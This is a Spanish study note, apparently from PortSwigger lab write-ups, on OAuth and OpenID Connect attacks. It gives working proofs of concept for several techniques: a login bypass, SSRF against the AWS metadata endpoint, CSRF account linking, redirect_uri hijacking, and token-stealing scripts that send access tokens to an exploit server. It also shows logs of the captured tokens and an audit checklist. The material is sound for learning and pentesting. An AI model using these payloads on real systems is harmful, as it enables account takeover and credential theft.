
---
Tags: #oauth2 #openid-connect #oidc #ssrf #csrf #account-takeover  #identity-management #access-control 

---
### Índice de Contenidos

- [[#1. Autenticación con OAuth y OpenID Conceptos Clave]]
    
- [[#2. Bypass de login usando flujo implícito de OAuth]]
    
- [[#3. SSRF vía registro dinámico de cliente OpenID]]
    
- [[#4. Forzado de enlace entre perfiles OAuth (CSRF)]]
    
- [[#5. Secuestro de cuenta por manipulación de 'redirect_uri']]
    
- [[#6. Robo de token OAuth con redirección abierta (Open Redirect + Path Traversal)]]
    
- [[#7. Exfiltración de token OAuth vía postMessage e Iframe]]
	
- [[#8. Herramientas y Metodología de Reconocimiento]]
	[[#🛠️ Toolkit Recomendado]]
	
- [[#9. Checklist Rápido de Auditoría (Pentesting)]]
	
- [[#Referencias]]

---

## [[#1. Autenticación con OAuth y OpenID Conceptos Clave]]

Antes de entrar en la explotación, es vital recordar qué parámetros controlan el flujo y dónde suelen estar los fallos de implementación.

|**Parámetro**|**Descripción**|**Riesgo si se manipula/omite**|
|---|---|---|
|**`client_id`**|Identificador público de la aplicación.|Permite suplantar a la aplicación legítima (Client impersonation).|
|**`redirect_uri`**|URL a la que se envía el token/código tras el login.|**Crítico:** Si no se valida, permite robar tokens redirigiendo a servidores del atacante.|
|**`response_type`**|Define qué devuelve el servidor (`code` o `token`).|Determina el flujo (Authorization Code o Implicit).|
|**`state` / `nonce`**|Valores únicos para prevenir CSRF y ataques de repetición.|Si se omite o no se valida, permite ataques de CSRF (forzado de cuentas).|

> [!info] **Herramienta Clave:** Burp Suite. En todos estos ataques, el uso del proxy de Burp y el historial HTTP es fundamental para observar los parámetros que viajan por el navegador (`GET` y `POST`) y la fragmentación de URLs (`#`).

---

## [[#2. Bypass de login usando flujo implícito de OAuth]]

El **flujo implícito** fue diseñado para aplicaciones Single Page Applications (SPA) antiguas. En lugar de devolver un código seguro, devuelve el `access_token` directamente en la URL.

### 🕵️‍♂️ Cómo descubrirlo y Root Cause (Causa Raíz)

El fallo crítico aquí **no** está en el proveedor de OAuth, sino en la **aplicación cliente**. A menudo, la aplicación cliente recibe el token, consulta los datos del usuario al proveedor (como el email) y luego envía una petición `POST` a su propio backend para iniciar la sesión.

Si el backend de la aplicación cliente confía ciegamente en parámetros como el `email` o `username` enviados desde el navegador del usuario sin verificar la firma del token contra ese usuario específico, tenemos un bypass.

### 💥 Explotación (PoC)

Interceptamos la petición donde el cliente (frontend) le dice al servidor (backend) quién acaba de iniciar sesión.

**Petición interceptada:**

```HTTP
POST /authenticate HTTP/2
Host: 0a3300dd034bf4d584864bd0004f00fe.web-security-academy.net
Cookie: session=dF0nPvlli4Y5nMYlbtn9TOmWaxpWPRg4
Content-Type: application/json

{
    "email":"mi-correo@ejemplo.com",
    "username":"mi-usuario",
    "token":"8mMNJGihHw7RS4FmBaZMu54jXQWpuMonKypdsoEsphf"
}
```

**Modificación Maliciosa:**

Mantenemos nuestro `token` válido, pero alteramos el `email` y `username` por los de nuestra víctima (ej. `carlos`):

```JSON
{
    "email":"carlos@carlos-montoya.net",
    "username":"carlos",
    "token":"8mMNJGihHw7RS4FmBaZMu54jXQWpuMonKypdsoEsphf"
}
```

**Resultado:** El servidor backend asume que el token pertenece a "carlos" y nos devuelve una cookie de sesión autenticada como la víctima.

---

## [[#3. SSRF vía registro dinámico de cliente OpenID]]

OpenID Connect (OIDC) es una capa de identidad sobre OAuth 2.0. Una característica muy potente (y peligrosa) es el **Registro Dinámico de Clientes**, que permite a las aplicaciones registrarse automáticamente en el proveedor de OIDC.

### 🕵️‍♂️ Cómo descubrirlo y Root Cause

Para descubrir la configuración de OpenID, siempre debemos buscar el endpoint estándar: `/.well-known/openid-configuration`.

**Petición de descubrimiento:**

```HTTP
GET /.well-known/openid-configuration HTTP/2
Host: oauth-0a98002803fd279b83690888022c00ba.oauth-server.net
```

Al analizar la respuesta JSON, buscamos el campo `"registration_endpoint"`. Si la API permite a cualquiera enviar un `POST` para registrar un cliente sin autenticación previa, y no valida correctamente los parámetros de URLs (como `logo_uri` o `client_uri`), es vulnerable a SSRF (Server-Side Request Forgery).

### 💥 Explotación (PoC)

Hacemos un `POST` al endpoint de registro. En el parámetro `logo_uri`, inyectamos la URL de un servicio interno (por ejemplo, el endpoint de metadatos de AWS).

**Petición de Registro Malicioso:**

```HTTP
POST /reg HTTP/2
Host: oauth-0a98002803fd279b83690888022c00ba.oauth-server.net
Content-Type: application/json
Content-Length: 249

{
    "redirect_uris":[ 
        "https://client-app.com/callback2"
    ],
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```

_El servidor OAuth nos responderá con un `client_id` (Ej: `kHzMPtS9RNidzn96E6xQz`)._

Para ejecutar el SSRF, solo necesitamos que el servidor intente cargar el "logo" que acabamos de registrar. Hacemos una petición al endpoint del cliente generado:

**Trigger del SSRF:**

```HTTP
GET /client/kHzMPtS9RNidzn96E6xQz/logo HTTP/2
Host: oauth-0a98002803fd279b83690888022c00ba.oauth-server.net
```

**Resultado:** El servidor, al intentar obtener la imagen del logo, hace un `GET` interno a la IP de AWS y nos devuelve las credenciales IAM del administrador en la respuesta.

> [!check] **Referencia Oficial:** [PortSwigger - Identifying OpenID Connect](https://portswigger.net/web-security/oauth/openid#identifying-openid-connect)

---

## [[#4. Forzado de enlace entre perfiles OAuth (CSRF)]]

Este ataque es un tipo de **Cross-Site Request Forgery (CSRF)** específico de integraciones OAuth (por ejemplo, "Vincular con redes sociales").

### 🕵️‍♂️ Cómo descubrirlo y Root Cause

Cuando vinculamos una red social a una cuenta existente, el proveedor envía un código (`code`) de vuelta a nuestra aplicación.

El fallo existe si la aplicación **no utiliza el parámetro `state`** (o no lo valida). El parámetro `state` debería ser un token aleatorio atado a la sesión actual del usuario. Si no existe, no hay forma de verificar quién inició la solicitud de enlace.

### 💥 Explotación (PoC)

1. El atacante inicia sesión en su propia cuenta y comienza el proceso de vincular su perfil de redes sociales.
    
2. Intercepta y **descarta (drop)** la petición final (el callback que contiene el `code`), impidiendo que su cuenta consuma ese código.
    
3. El atacante incrusta esa URL en un `iframe` dentro de un sitio web que controla (el Exploit Server).
    

**Payload en el servidor del atacante:**

```HTML
<iframe src="https://0a850033032d331b8087c69d001100a1.web-security-academy.net/oauth-linking?code=YZUA_66Y-rzorJ2BgFLT1Sa7bw2XRn9Vuz-aRVL_ShV"></iframe>
```

**Resultado:** Cuando la víctima, que tiene una sesión activa en la aplicación, carga el iframe, su navegador envía la petición de enlace. La aplicación recibe el `code` (que pertenece a la red social del atacante) y lo vincula a la cuenta de la víctima. Ahora, el atacante puede usar la función "Iniciar sesión con Redes Sociales" para entrar directamente en la cuenta de la víctima.

---
## [[#5. Secuestro de cuenta por manipulación de 'redirect_uri']]

Este es uno de los ataques más clásicos y devastadores en OAuth. Consiste en robar el código de autorización (`code`) del usuario forzando al proveedor de OAuth a enviarlo a un servidor controlado por el atacante en lugar de a la aplicación legítima.

### 🕵️‍♂️ Cómo descubrirlo y Root Cause

La **causa raíz** es la falta de una validación estricta (lista blanca o _whitelist_) del parámetro `redirect_uri` en el servidor de autorización de OAuth. Para descubrirlo, durante el flujo de inicio de sesión, interceptamos la petición de autorización (`/auth?client_id=...&redirect_uri=...`) y cambiamos el dominio del `redirect_uri` por nuestro servidor (ej. Burp Collaborator o el Exploit Server). Si el servidor no da error y realiza la redirección hacia nuestro dominio con el `code`, es vulnerable.

### 💥 Explotación (PoC)

1. Construimos una URL de autorización maliciosa con el `client_id` legítimo pero con el `redirect_uri` apuntando a nuestro servidor.
    
2. Incrustamos esta URL en un `iframe` dentro de nuestro exploit y engañamos a la víctima (el administrador) para que lo visite. Como la víctima ya tiene una sesión activa en el proveedor OAuth, el flujo se completa automáticamente.
    

**Payload en el servidor del atacante (Exploit Server):**

```HTML
<iframe src="https://oauth-0aca0063033ee98a80d3e75c02bd004f.oauth-server.net/auth?client_id=vcpqx3q1pygb1cen1ppfo&redirect_uri=https://exploit-0a4d00db032ce9088099e8cc016c0079.exploit-server.net/oauth-callback&response_type=code&scope=openid%20profile%20email"></iframe>
```

**Log recibido en nuestro servidor (Robo del código):**

Plaintext

```
10.0.3.233      2026-02-20 13:53:40 +0000 "GET /oauth-callback?code=XWOE8BQ-nSn4sb22roYbA2ZqaU2WuN3NXDSDjWxmddy HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim)
```

> [!warning] **Acción final:** Con este código interceptado, el atacante simplemente visita el `callback` legítimo de la aplicación añadiendo este parámetro: `https://app-vulnerable.com/oauth-callback?code=XWOE8BQ...` y automáticamente inicia sesión como el administrador.

---

## [[#6. Robo de token OAuth con redirección abierta (Open Redirect + Path Traversal)]]

A veces, el servidor OAuth sí valida el `redirect_uri`, pero lo hace mal (por ejemplo, validando solo que _empiece_ por el dominio legítimo o el directorio base). Si podemos usar _Path Traversal_ (`/../`) para salir del directorio del callback y alcanzar una vulnerabilidad de **Open Redirect** dentro de la misma aplicación cliente, podemos robar el token de acceso.

### 🕵️‍♂️ Cómo descubrirlo y Root Cause

1. **Validación débil de URI:** Verificamos si el `redirect_uri` acepta secuencias de salto de directorio, por ejemplo: `https://app.com/callback/../otra-ruta`.
    
2. **Open Redirect:** Buscamos funcionalidades en la aplicación cliente que redirijan basándose en un parámetro (ej. `?path=`).
    
3. **Flujo Implícito:** Como el flujo es `response_type=token`, el token viaja en el **fragmento** de la URL (`#access_token=...`). Los fragmentos _no_ se envían al servidor en las redirecciones HTTP estándar, por lo que necesitamos un script JS para extraerlo.
    

### 💥 Explotación (PoC)

Encadenamos el Path Traversal en el `redirect_uri` para apuntar al Open Redirect, el cual a su vez apunta a nuestro Exploit Server.

**Script malicioso entregado a la víctima:**

```javascript
<script>
// Si la URL no tiene fragmento (hash), iniciamos el flujo malicioso
if(!document.location.hash){
    window.location="https://oauth-0a1200e30367f1ac80a20b0c02bd00c7.oauth-server.net/auth?client_id=pds29tnvwnuviz4riflys&redirect_uri=https://oauth-0a1200e30367f1ac80a20b0c02bd00c7.oauth-server.net/oauth_callback/../post/next?path=https://exploit-0a2900ca03eff19a803f0c82015d001b.exploit-server.net/exploit&response_type=token&nonce=-1199722456&scope=openid%20profile%20email";
}else{
// Cuando vuelve a cargar con el token en el fragmento, lo extraemos y lo enviamos a nuestro log
    window.location= "/?" + document.location.hash.substr(1);
}
</script>
```

**Log en el servidor del atacante (Token capturado como parámetro GET):**

Plaintext

```
10.0.3.241      2026-02-20 17:41:14 +0000 "GET /?access_token=Q41dS1MDGLkBKPzWehFHCOqWRhCfuLVHKcX-nyrO3cN&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
```

**Uso del token robado (Post-Explotación):**

```HTTP
GET /me HTTP/2
Host: oauth-0a1200e30367f1ac80a20b0c02bd00c7.oauth-server.net
Authorization: Bearer Q41dS1MDGLkBKPzWehFHCOqWRhCfuLVHKcX-nyrO3cN
```

_Esto nos permite consultar la API en nombre de la víctima y obtener su API Key._

---

## [[#7. Exfiltración de token OAuth vía postMessage e Iframe]]

Esta técnica es una variante brillante del ataque anterior. En lugar de usar un Open Redirect clásico para sacar el token de la aplicación, utilizamos una ruta legítima de la aplicación que procesa la URL y emite un evento `postMessage` a su ventana padre (parent).

### 🕵️‍♂️ Cómo descubrirlo y Root Cause

1. Logramos un salto de directorio (`/../`) en el `redirect_uri`.
    
2. Identificamos un endpoint (ej. un formulario de comentarios) diseñado para ser incrustado como un `iframe`. Estos componentes a menudo leen datos de su URL (incluyendo el fragmento `#`) y los envían a la ventana principal usando `window.parent.postMessage()`.
    
3. Si la aplicación envía el token ciegamente usando `postMessage` sin verificar el origen (origin) del padre, cualquier atacante que incruste ese formulario puede escuchar el mensaje y robar el token.
    

### 💥 Explotación (PoC)

En nuestro servidor malicioso incrustamos el flujo OAuth en un iframe, usando el Path Traversal para que el flujo termine en la ruta vulnerable de comentarios. Simultáneamente, configuramos un _listener_ en nuestra página para capturar el evento `message`.

**Payload en el servidor del atacante:**

```HTML
<iframe src="https://oauth-0ae9007804526883800e0191028c00ab.oauth-server.net/auth?client_id=zi4lun7qhccum9vqh3rnh&redirect_uri=https://0a4b00d304c268cf8091039800a90053.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1932401166&scope=openid%20profile%20email"></iframe>

<script>
    window.addEventListener('message', function(e) { 
        // Exfiltramos el contenido del mensaje a nuestro servidor
        fetch("/" + encodeURIComponent(e.data.data));
    })
</script>
```

**Log del token exfiltrado:**

Plaintext

```
10.0.4.104      2026-02-22 15:52:47 +0000 "GET /https%3A%2F%2F0a4b00d304c268cf8091039800a90053.web-security-academy.net%2Fpost%2Fcomment%2Fcomment-form%23access_token%3DJQAqESttz2p4r1nyxRqYYx0cCjs3ziPSFEcVIlFAED2
```

**Uso del token para obtener datos:**

```HTTP
GET /me HTTP/2
Host: oauth-0ae9007804526883800e0191028c00ab.oauth-server.net
Authorization: Bearer JQAqESttz2p4r1nyxRqYYx0cCjs3ziPSFEcVIlFAED2
```

_Respuesta del servidor:_

```JSON
{"sub":"administrator","apikey":"QjqnGGIyp83RhHqBZXh3kWoiVvwWi6Px","name":"Administrator","email":"administrator@normal-user.net","email_verified":true}
```

---
### 8. Herramientas y Metodología de Reconocimiento

Para auditar OAuth, no solo basta con el proxy; hay extensiones y scripts que exponen vulnerabilidades de forma mucho más rápida.

#### 🛠️ Toolkit Recomendado

|**Herramienta**|**Uso en OAuth / OIDC**|**Por qué usarla**|
|---|---|---|
|**Burp Suite Professional**|Intercepción y Repeater.|Esencial para modificar `redirect_uri` y probar SSRF.|
|**OAuth Analysis (BApp)**|Extensión de Burp Suite.|Identifica automáticamente flujos inseguros y parámetros faltantes.|
|**JWT Editor**|Extensión de Burp Suite.|Si el token es un JWT, permite probar ataques de firma `none` o `key confusion`.|
|**Postman**|Pruebas de API.|Ideal para interactuar con el endpoint `/me` o `/userinfo` una vez robado el token.|
|**Exploit Server / Collaborator**|Exfiltración.|Necesario para recibir los `codes` o `tokens` en los ataques de redirección.|

---

### [[#9. Checklist Rápido de Auditoría (Pentesting)]]

Copia esto en tu nota de Obsidian para tener una guía de pasos rápidos cuando te enfrentes a un panel de login con OAuth:

1. **Reconocimiento de Endpoints:**
    
    - [ ] ¿Existe `/.well-known/openid-configuration`?
        
    - [ ] ¿El `registration_endpoint` permite registros sin autenticación? (Probar SSRF).
        
2. **Manipulación de Redirect URI:**
    
    - [ ] ¿Puedo cambiar el dominio de `redirect_uri` a un servidor externo?
        
    - [ ] ¿Puedo usar Path Traversal (`/../`) para llegar a otra parte del sitio?
        
    - [ ] ¿El servidor acepta múltiples `redirect_uri` en la misma petición?
        
3. **Seguridad del Flujo:**
    
    - [ ] ¿Se usa el parámetro `state`? Si no, intentar CSRF (Forzado de enlace).
        
    - [ ] ¿Se usa el parámetro `nonce` en OIDC? Si no, intentar ataques de repetición.
        
    - [ ] ¿Qué pasa si cambio `response_type=code` por `response_type=token`? (Forzar flujo implícito).
        
4. **Exfiltración de Datos:**
    
    - [ ] ¿Hay algún **Open Redirect** en el dominio principal?
        
    - [ ] ¿Hay algún componente que use `postMessage` y pueda ser incrustado en un `iframe`?


---
### Referencias

- [Portswigger OpenID](https://portswigger.net/web-security/oauth/openid)